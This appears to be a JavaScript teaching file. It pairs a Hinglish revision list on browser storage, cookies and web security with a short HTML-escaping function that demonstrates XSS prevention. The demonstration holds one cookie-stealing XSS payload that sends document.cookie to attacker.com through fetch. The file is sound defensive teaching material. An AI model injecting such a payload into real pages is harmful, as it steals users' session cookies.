/**
 * ## Quick revision
 *
 * - `localStorage` — origin-scoped string storage; synchronous aur browser mein persistent.
 * - `sessionStorage` — tab session tak data; reload par rehta hai.
 * - JSON storage — serialize/parse karo; malformed ya old data validate karo.
 * - IndexedDB — async structured storage; bade/offline data ke liye.
 * - Cookie — matching requests ke saath ja sakti hai; flags aur scope important.
 * - Secret — browser-readable storage mein sensitive credentials rakhna risky hai.
 * - Quota — writes fail ho sakti hain; fallback aur error handling rakho.
 * - `storage` event — doosre matching documents ko change pata chalta hai; writer ko nahi.
 * - Offline conflict — version/merge rule rakho; last write blindly accept mat karo.
 * - Service worker — network requests intercept/cache; lifecycle/version updates handle.
 * - Cache-first — speed/offline; network-first — freshness; stale-while-revalidate — cached then refresh.
 * - HttpOnly cookie — JS read block; CSRF protection aur server auth phir bhi chahiye.
 * - XSS — unsafe script injection; output encoding, sanitization aur CSP defense.
 * - CORS — browser policy; authentication ka substitute nahi.
 * - Schema version — stored data ka version rakho; old format migrate ya safe fallback.
 * - Atomic browser data — related IndexedDB changes same transaction mein group karo.
 * - Storage scope — origin badla toh storage alag; private mode/blocked storage failure handle karo.
 */

'use strict';


// Simulation of Input Sanitization against XSS
function sanitizeUserInput(dirtyHtml) {
  return dirtyHtml
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

const maliciousPayload = '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>';
console.log('--- XSS Prevention Demonstration ---');
console.log('Original attack payload:', maliciousPayload);
console.log('Sanitized safe output:', sanitizeUserInput(maliciousPayload));
